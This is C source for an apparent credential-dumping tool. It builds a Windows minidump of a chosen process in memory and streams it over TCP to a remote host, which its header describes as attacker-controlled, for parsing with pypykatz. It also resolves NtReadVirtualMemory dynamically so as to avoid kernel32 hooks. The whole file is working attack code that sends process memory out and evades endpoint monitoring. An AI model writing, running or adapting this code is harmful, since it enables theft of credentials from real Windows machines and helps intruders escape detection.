/*
 * dump_remote.c — Manual minidump builder, streamed over TCP
 *
 * Builds a valid minidump format entirely in memory (no MiniDumpWriteDump,
 * no file on disk). Streams it to an attacker-controlled host for offline
 * parsing with pypykatz or similar.
 *
 * Uses NtReadVirtualMemory (dynamically resolved) instead of
 * ReadProcessMemory to avoid kernel32 hooks.
 *
 * Minidump layout:
 *   Header (32 bytes)
 *   Directory[3] (3 × 12 = 36 bytes)
 * 
 *   CSD version string (4 + 0 = 4 bytes, empty)
 *   SystemInfoStream (56 bytes)
 *   ModuleListStream (4 + N × sizeof(MD_MODULE) + name strings)
 *   Memory64ListStream header + descriptors
 *   Memory data (streamed directly, not buffered)
 */

#define _CRT_SECURE_NO_WARNINGS
#pragma comment(lib, "ws2_32")

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <psapi.h>
#include "ntdefs.h"
#include "dump.h"

 /* ── Helpers ─────────────────────────────────────────────────────── */

static pNtReadVirtualMemory resolve_NtReadVirtualMemory(void) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return NULL;
    return (pNtReadVirtualMemory)(void*)GetProcAddress(ntdll,
        "NtReadVirtualMemory");
}

/* ── Output abstraction (socket or file) ────────────────────────── */

typedef enum { OUT_SOCKET, OUT_FILE } OUT_TYPE;
typedef struct {
    OUT_TYPE type;
    union {
        SOCKET sock;
        HANDLE hFile;
    };
} DUMP_OUTPUT;

static BOOL send_all(SOCKET s, const void* buf, int len) {
    const char* p = (const char*)buf;
    while (len > 0) {
        int sent = send(s, p, len, 0);
        if (sent <= 0) return FALSE;
        p += sent;
        len -= sent;
    }
    return TRUE;
}

static BOOL write_out(DUMP_OUTPUT* out, const void* buf, DWORD len) {
    if (out->type == OUT_SOCKET) {
        return send_all(out->sock, buf, (int)len);
    }
    else {
        DWORD written;
        return WriteFile(out->hFile, buf, len, &written, NULL) &&
            written == len;
    }
}

/* Read remote process memory via NtReadVirtualMemory */
static BOOL read_proc_mem(pNtReadVirtualMemory NtRead, HANDLE hProc,
    ULONG_PTR addr, PVOID buf, SIZE_T size) {
    SIZE_T bytes_read = 0;
    NTSTATUS st = NtRead(hProc, (PVOID)addr, buf, size, &bytes_read);
    return NT_SUCCESS(st) && (bytes_read == size);
}

/* ── Memory region enumeration ───────────────────────────────────── */

typedef struct {
    ULONG_PTR base;
    SIZE_T    size;
} MEM_REGION;

static MEM_REGION* enum_memory_regions(HANDLE hProc, DWORD* count) {
    DWORD cap = 512;
    DWORD n = 0;
    MEM_REGION* regions = (MEM_REGION*)malloc(cap * sizeof(MEM_REGION));
    if (!regions) return NULL;

    MEMORY_BASIC_INFORMATION mbi;
    ULONG_PTR addr = 0;

    while (VirtualQueryEx(hProc, (LPCVOID)addr, &mbi, sizeof(mbi))) {
        /* Include committed, readable memory */
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & (PAGE_READWRITE | PAGE_READONLY |
                PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE |
                PAGE_WRITECOPY | PAGE_EXECUTE_WRITECOPY))) {
            /* Skip guard/noaccess pages */
            if (!(mbi.Protect & (PAGE_GUARD | PAGE_NOACCESS))) {
                if (n >= cap) {
                    cap *= 2;
                    MEM_REGION* tmp = (MEM_REGION*)realloc(regions,
                        cap * sizeof(MEM_REGION));
                    if (!tmp) { free(regions); return NULL; }
                    regions = tmp;
                }
                regions[n].base = (ULONG_PTR)mbi.BaseAddress;
                regions[n].size = mbi.RegionSize;
                n++;
            }
        }

        ULONG_PTR next = (ULONG_PTR)mbi.BaseAddress + mbi.RegionSize;
        if (next <= addr) break;   /* overflow guard */
        addr = next;
    }

    *count = n;
    return regions;
}

/* ── Module enumeration ──────────────────────────────────────────── */

typedef struct {
    HMODULE base;
    DWORD   size;
    WCHAR   path[MAX_PATH];
} MOD_INFO;

static MOD_INFO* enum_modules(HANDLE hProc, DWORD* count) {
    HMODULE mods[1024];
    DWORD needed = 0;

    if (!EnumProcessModulesEx(hProc, mods, sizeof(mods), &needed,
        LIST_MODULES_ALL)) {
        *count = 0;
        return NULL;
    }

    DWORD n = needed / sizeof(HMODULE);
    MOD_INFO* info = (MOD_INFO*)calloc(n, sizeof(MOD_INFO));
    if (!info) { *count = 0; return NULL; }

    DWORD actual = 0;
    for (DWORD i = 0; i < n; i++) {
        MODULEINFO mi = { 0 };
        if (!GetModuleInformation(hProc, mods[i], &mi, sizeof(mi)))
            continue;

        info[actual].base = mods[i];
        info[actual].size = mi.SizeOfImage;

        if (!GetModuleFileNameExW(hProc, mods[i], info[actual].path, MAX_PATH))
            wcscpy(info[actual].path, L"unknown.dll");

        actual++;
    }

    *count = actual;
    return info;
}

/* ── Shared minidump builder ─────────────────────────────────────── */

static BOOL build_minidump(DWORD pid, DUMP_OUTPUT* out) {
    /* Resolve NtReadVirtualMemory */
    pNtReadVirtualMemory NtRead = resolve_NtReadVirtualMemory();
    if (!NtRead) {
        printf("[-] Failed to resolve NtReadVirtualMemory\n");
        return FALSE;
    }

    /* Open target process */
    HANDLE hProc = OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hProc) {
        printf("[-] OpenProcess failed: %lu\n", GetLastError());
        return FALSE;
    }

    /* Get OS version info */
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    pRtlGetVersion RtlGetVersion =
        (pRtlGetVersion)(void*)GetProcAddress(ntdll, "RtlGetVersion");
    RTL_OSVERSIONINFOW vi = { 0 };
    vi.dwOSVersionInfoSize = sizeof(vi);
    RtlGetVersion(&vi);

    /* Enumerate modules */
    DWORD mod_count = 0;
    MOD_INFO* modules = enum_modules(hProc, &mod_count);
    printf("[*] Enumerated %lu modules\n", mod_count);

    /* Enumerate memory regions */
    DWORD region_count = 0;
    MEM_REGION* regions = enum_memory_regions(hProc, &region_count);
    if (!regions || region_count == 0) {
        printf("[-] No memory regions found\n");
        if (modules) free(modules);
        CloseHandle(hProc);
        return FALSE;
    }
    printf("[*] Enumerated %lu memory regions\n", region_count);

    /* ── Calculate RVAs ──────────────────────────────────────── */

    ULONG32 csd_length = 0;
    ULONG32 csd_total = sizeof(MD_STRING) + sizeof(WCHAR);

    ULONG32 mod_names_size = 0;
    for (DWORD i = 0; i < mod_count; i++) {
        DWORD namelen = (DWORD)(wcslen(modules[i].path) * sizeof(WCHAR));
        mod_names_size += sizeof(MD_STRING) + namelen + sizeof(WCHAR);
    }

    ULONG32 rva = 0;

    rva += sizeof(MD_HEADER);
    ULONG32 dir_rva = rva;
    rva += 3 * sizeof(MD_DIRECTORY);
    ULONG32 csd_rva = rva;
    rva += csd_total;
    ULONG32 sysinfo_rva = rva;
    ULONG32 sysinfo_size = sizeof(MD_SYSINFO);
    rva += sysinfo_size;
    ULONG32 modlist_rva = rva;
    ULONG32 modlist_size = sizeof(MD_MODULE_LIST) +
        mod_count * sizeof(MD_MODULE);
    ULONG32 mod_names_rva = modlist_rva + modlist_size;
    rva += modlist_size + mod_names_size;
    ULONG32 mem64_rva = rva;
    ULONG32 mem64_hdr_size = sizeof(MD_MEMORY64_LIST) +
        region_count * sizeof(MD_MEM_DESC64);
    rva += mem64_hdr_size;
    ULONG64 mem_data_base_rva = (ULONG64)rva;

    printf("[*] Minidump metadata: %u bytes\n", rva);

    BOOL ok = FALSE;

    /* ── Header ──────────────────────────────────────────────── */
    {
        MD_HEADER hdr = { 0 };
        hdr.Signature = MD_SIGNATURE;
        hdr.Version = MD_VERSION;
        hdr.NumberOfStreams = 3;
        hdr.StreamDirectoryRva = dir_rva;
        hdr.TimeDateStamp = (ULONG32)time(NULL);
        hdr.Flags = MD_FLAGS_FULL_MEMORY;
        if (!write_out(out, &hdr, sizeof(hdr))) goto done;
    }

    /* ── Directory ───────────────────────────────────────────── */
    {
        MD_DIRECTORY dirs[3];
        dirs[0].StreamType = MD_STREAM_SYSTEM_INFO;
        dirs[0].Location.DataSize = sysinfo_size;
        dirs[0].Location.Rva = sysinfo_rva;
        dirs[1].StreamType = MD_STREAM_MODULE_LIST;
        dirs[1].Location.DataSize = modlist_size + mod_names_size;
        dirs[1].Location.Rva = modlist_rva;
        dirs[2].StreamType = MD_STREAM_MEMORY64_LIST;
        dirs[2].Location.DataSize = mem64_hdr_size;
        dirs[2].Location.Rva = mem64_rva;
        if (!write_out(out, dirs, sizeof(dirs))) goto done;
    }

    /* ── CSD version (empty string) ──────────────────────────── */
    {
        MD_STRING csd = { 0 };
        csd.Length = csd_length;
        if (!write_out(out, &csd, sizeof(csd))) goto done;
        WCHAR null_term = 0;
        if (!write_out(out, &null_term, sizeof(null_term))) goto done;
    }

    /* ── SystemInfo ──────────────────────────────────────────── */
    {
        SYSTEM_INFO si;
        GetSystemInfo(&si);

        MD_SYSINFO sysinfo = { 0 };
        sysinfo.ProcessorArchitecture = si.wProcessorArchitecture;
        sysinfo.ProcessorLevel = si.wProcessorLevel;
        sysinfo.ProcessorRevision = si.wProcessorRevision;
        sysinfo.NumberOfProcessors = (UCHAR)si.dwNumberOfProcessors;
        sysinfo.ProductType = VER_NT_WORKSTATION;
        sysinfo.MajorVersion = vi.dwMajorVersion;
        sysinfo.MinorVersion = vi.dwMinorVersion;
        sysinfo.BuildNumber = vi.dwBuildNumber;
        sysinfo.PlatformId = 2;
        sysinfo.CSDVersionRva = csd_rva;
        if (!write_out(out, &sysinfo, sizeof(sysinfo))) goto done;
    }

    /* ── ModuleList ──────────────────────────────────────────── */
    {
        MD_MODULE_LIST mlist = { 0 };
        mlist.NumberOfModules = mod_count;
        if (!write_out(out, &mlist, sizeof(mlist))) goto done;

        ULONG32 cur_name_rva = mod_names_rva;
        for (DWORD i = 0; i < mod_count; i++) {
            MD_MODULE mod = { 0 };
            mod.BaseOfImage = (ULONG64)(ULONG_PTR)modules[i].base;
            mod.SizeOfImage = modules[i].size;
            mod.ModuleNameRva = cur_name_rva;
            DWORD namelen = (DWORD)(wcslen(modules[i].path) * sizeof(WCHAR));
            cur_name_rva += sizeof(MD_STRING) + namelen + sizeof(WCHAR);
            if (!write_out(out, &mod, sizeof(mod))) goto done;
        }

        for (DWORD i = 0; i < mod_count; i++) {
            DWORD namelen = (DWORD)(wcslen(modules[i].path) * sizeof(WCHAR));
            MD_STRING name_hdr = { 0 };
            name_hdr.Length = namelen;
            if (!write_out(out, &name_hdr, sizeof(name_hdr))) goto done;
            if (!write_out(out, modules[i].path, namelen)) goto done;
            WCHAR null_term = 0;
            if (!write_out(out, &null_term, sizeof(null_term))) goto done;
        }
    }

    /* ── Memory64List ────────────────────────────────────────── */
    {
        MD_MEMORY64_LIST mem_hdr = { 0 };
        mem_hdr.NumberOfMemoryRanges = region_count;
        mem_hdr.BaseRva = mem_data_base_rva;
        if (!write_out(out, &mem_hdr, sizeof(mem_hdr))) goto done;

        for (DWORD i = 0; i < region_count; i++) {
            MD_MEM_DESC64 desc = { 0 };
            desc.StartOfMemoryRange = regions[i].base;
            desc.DataSize = regions[i].size;
            if (!write_out(out, &desc, sizeof(desc))) goto done;
        }
    }

    /* ── Memory data ─────────────────────────────────────────── */
    printf("[*] Writing memory (%lu regions)...\n", region_count);
    {
        BYTE* chunk = (BYTE*)malloc(65536);
        if (!chunk) goto done;

        ULONG64 total = 0;
        for (DWORD i = 0; i < region_count; i++) {
            SIZE_T remaining = regions[i].size;
            ULONG_PTR addr = regions[i].base;

            while (remaining > 0) {
                SIZE_T to_read = remaining > 65536 ? 65536 : remaining;
                memset(chunk, 0, to_read);
                read_proc_mem(NtRead, hProc, addr, chunk, to_read);

                if (!write_out(out, chunk, (DWORD)to_read)) {
                    free(chunk);
                    goto done;
                }

                addr += to_read;
                remaining -= to_read;
                total += to_read;
            }

            if ((i + 1) % 100 == 0 || i == region_count - 1) {
                printf("  [%lu/%lu] regions, %.1f MB written\r",
                    i + 1, region_count,
                    (double)total / (1024.0 * 1024.0));
                fflush(stdout);
            }
        }

        printf("\n[+] Dump complete: %.1f MB\n",
            (double)total / (1024.0 * 1024.0));
        free(chunk);
    }

    ok = TRUE;

done:
    if (!ok) printf("[-] Write failed during dump\n");
    free(modules);
    free(regions);
    CloseHandle(hProc);
    return ok;
}

/* ── Public: TCP streamer ───────────────────────────────────────── */

BOOL dump_remote(DWORD pid, const char* host, USHORT port) {
    printf("[*] Remote dump: building minidump for PID %lu\n", pid);
    printf("[*] Target: %s:%u\n", host, port);

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("[-] WSAStartup failed\n");
        return FALSE;
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        printf("[-] Socket creation failed\n");
        WSACleanup();
        return FALSE;
    }

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    inet_pton(AF_INET, host, &sa.sin_addr);

    printf("[*] Connecting to %s:%u...\n", host, port);
    if (connect(sock, (struct sockaddr*)&sa, sizeof(sa)) != 0) {
        printf("[-] Connection failed: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return FALSE;
    }
    printf("[+] Connected!\n");

    DUMP_OUTPUT out = { .type = OUT_SOCKET, .sock = sock };
    BOOL result = build_minidump(pid, &out);

    closesocket(sock);
    WSACleanup();
    return result;
}

/* ── Public: Local file dump ────────────────────────────────────── */

BOOL dump_local(DWORD pid, const wchar_t* path) {
    printf("[*] Local dump: building minidump for PID %lu\n", pid);
    printf("[*] Output: %ls\n", path);

    HANDLE hFile = CreateFileW(path, GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create file: %lu\n", GetLastError());
        return FALSE;
    }

    DUMP_OUTPUT out = { .type = OUT_FILE, .hFile = hFile };
    BOOL result = build_minidump(pid, &out);

    CloseHandle(hFile);

    if (result)
        printf("[+] Dump saved to %ls\n", path);
    else
        DeleteFileW(path);  /* clean up partial file on failure */

    return result;
}